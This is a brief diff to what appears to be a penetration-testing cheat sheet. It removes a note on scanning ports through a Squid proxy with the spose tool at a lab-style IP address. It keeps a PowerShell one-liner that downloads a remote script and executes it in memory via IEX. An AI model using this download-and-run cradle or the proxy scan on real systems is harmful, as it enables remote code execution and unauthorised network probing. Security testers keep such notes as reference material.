@@ -1,10 +1,3 @@
-# Squid Proxy
-```bash
-python3 spose.py --proxy http://10.10.11.131:3128 --target 10.10.11.131
-```
-- https://github.com/aancw/spose
-
----
 # powershell
 ```powershell
 IEX(New-Object Net.WebClient).DownloadString("http://ip/file")
